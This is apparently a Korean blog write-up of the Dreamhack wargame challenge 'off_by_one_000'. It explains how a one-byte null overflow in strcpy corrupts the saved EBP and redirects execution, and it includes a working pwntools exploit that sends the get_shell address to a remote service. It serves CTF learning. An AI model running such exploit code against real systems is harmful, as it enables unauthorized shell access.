---
layout: post
title: "[DH]off_by_one_000"
category: Wargame
tag:
- dreamhack
- pwn
date: 2025-10-30 22:35 +0900
---
### INFO
![chall]
_Fig 1. Challenge_

``` c
// 환경 및 코드 일부
/* Environment
    Ubuntu 16.04
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
*/
char cp_name[256];

void get_shell()
{
    system("/bin/sh");
}

int cpy()
{
    char real_name[256];                    ------ (2)
    strcpy(real_name, cp_name);             ------ (3)
    return 0;                               ------ (4)
}

int main()
{
    initialize();
    printf("Name: ");
    read(0, cp_name, sizeof(cp_name));      ------ (1)

    cpy();                              

    printf("Name: %s", cp_name);

    return 0;                               ------ (5)
}
```
### RECON
PIE와 카나리가 꺼져있어서 stack 기반 off-by-one 취약점이 존재할 것이라 짐작할 수 있습니다.

cp_name은 초기화되지 않은 상태라 `.bss` 섹션에 존재합니다.
```sh
└─$ objdump -t off_by_one_000 | grep cp_name
0804a060 g     O .bss   00000100              cp_name
```

### SOLVE
취약점 발현 과정은 다음과 같습니다.

    (1) 입력 가능한 크기가 버퍼의 크기와 동일하여 마지막에 /n이 들어가지 못함.
    (2) 스택에 동일한 크기의 버퍼(real_name)를 만듦. (Fig2 참고)
    (3) \n가 256B내에 없기 때문에 real_name[256]에 00가 덮어씌워짐. (Fig3,4 참고)
    (4) cpy()의 에필로그에서 ebp가 real_name 버퍼 내의 값을 가르킴.
    (5) main()의 에필로그에서 esp가 잘못된 위치로 이동되며, eip가 real_name 안의 임의의 주소로 이동하여 실행하게 됨.

그림과 같이 다시 보겠습니다.

#### (2) cpy() 이후 스택 상황

![stack_3]
_Fig2. cpy() 이후 스택_

#### (3) strcpy() 이후 스택 상황

![stack_4]
_Fig3. saved ebp의 하위 2비트 변조_

real_name[256]은 Saved ebp의 하위 2비트를 의미한다.<br>
스택이 높은 주소에서 낮은 주소로 성장한다는 것과 리틀엔디안 환경이라는 점을 고려해보자.

#### (4~5) 스택 프레임 별 에필로그 상세 과정
먼저 cpy()에서 에필로그에 진입하기 이전 스택 상황을 보자.<br>

![stack_5]
_Fig 4. cpy() 에필로그 진입 이전_

addr1은 cpy 스택 프레임의 saved EBP 값을 의미하며, addr2는 off-by-one 취약점으로 인해 변경된 주소값을 의미한다.

에필로그는 다음과 같은 절차를 밟는다.
``` sh
mov $esp $ebp   # leave;
pop $ebp

pop $eip        # ret;
```

cpy() 스택 프레임의 에필로그 절차에서 `pop $ebp`에 오염된 ebp값이 들어간다.<br>
main() 스택 프레임의 에필로그 절차에서 `mov $esp $ebp`로 esp가 변조되고, `pop $eip`로 임의의 코드가 실행될 수 있다.

#### 그래서 페이로드는 뭔가요?
버퍼에는 실행하고자하는 임의의 주소값이 들어가야 한다.

우리는 get_shell() 함수를 실행시켜 쉘을 획득하여야 한다.
```sh
└─$ objdump -t off_by_one_000 | grep get_shell
080485db g     F .text  00000013              get_shell
```

이 4바이트를 64번 넣어서 payload를 작성하면 된다.

### POC
```py
from pwn import *

p = remote(IP, PORT)

addr = 0x080485db

payload = b''
payload += p32(addr)*0x40       # addr은 little-endian으로 들어가야 함!

p.sendlineafter(b'Name: ', payload)
p.interactive()
```

### 후기
생각보다 풀이에 많은 시간이 들었다.

스택 구조에서 엔디안을 고려하려고 하니깐 헷갈렸고, 에필로그에서 $esp, $ebp, $eip가 어떻게 유기적으로 처리되는지 상세히 알지 못했었다.

이를 그림으로 그리면서 검증해보니깐 이해가 잘 된 것 같다.<br>
추가로 스택 시각화 도구가 있으면 좋을 것 같아서 만들어보려고 한다. 


[chall]: /assets/DreamHack/off-by-one-000/chall.png
[stack_3]: /assets/DreamHack/off-by-one-000/stack_3.png
[stack_4]: /assets/DreamHack/off-by-one-000/stack_4.png
[stack_5]: /assets/DreamHack/off-by-one-000/stack_5.png